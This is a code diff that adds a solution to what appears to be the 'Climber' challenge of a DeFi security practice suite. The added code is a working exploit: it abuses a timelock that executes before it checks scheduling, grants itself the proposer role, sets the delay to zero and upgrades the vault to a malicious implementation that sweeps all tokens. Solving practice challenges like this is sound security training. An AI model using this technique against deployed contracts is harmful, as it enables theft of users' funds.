@@ -43,7 +43,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +88,15 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        AttackClimber attack = new AttackClimber(
+            player,
+            vault,
+            timelock,
+            token
+        );
+        attack.attack();
+
+        token.transfer(recovery, VAULT_TOKEN_BALANCE);
     }
 
     /**
@@ -93,6 +104,88 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract MaliciousVault is ClimberVault {
+    function sweepFunds(address recovery, address token) external {
+        DamnValuableToken(token).transfer(
+            recovery,
+            DamnValuableToken(token).balanceOf(address(this))
+        );
+    }
+}
+
+contract AttackClimber {
+    address public immutable player;
+    ClimberVault public immutable vault;
+    ClimberTimelock public immutable timelock;
+    DamnValuableToken public immutable token;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+    constructor(
+        address _player,
+        ClimberVault _vault,
+        ClimberTimelock _timelock,
+        DamnValuableToken _token
+    ) {
+        player = _player;
+        vault = _vault;
+        timelock = _timelock;
+        token = _token;
+
+        // Set up the targets, values, and data elements for the attack
+        targets = new address[](4);
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(vault);
+        targets[3] = address(this);
+
+        values = [0, 0, 0, 0];
+
+        dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeWithSignature(
+            "grantRole(bytes32,address)",
+            PROPOSER_ROLE,
+            address(this)
+        );
+        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        dataElements[2] = abi.encodeWithSignature(
+            "upgradeToAndCall(address,bytes)",
+            address(new MaliciousVault()),
+            abi.encodeWithSignature(
+                "sweepFunds(address,address)",
+                player,
+                address(token)
+            )
+        );
+        dataElements[3] = abi.encodeWithSignature("schedule()");
+    }
+
+    MaliciousVault vaultImpl = new MaliciousVault();
+
+    function attack() public {
+        timelock.execute(
+            targets,
+            values,
+            dataElements,
+            bytes32(0) // salt
+        );
+    }
+
+    function schedule() public {
+        timelock.schedule(
+            targets,
+            values,
+            dataElements,
+            bytes32(0) // salt
+        );
     }
 }
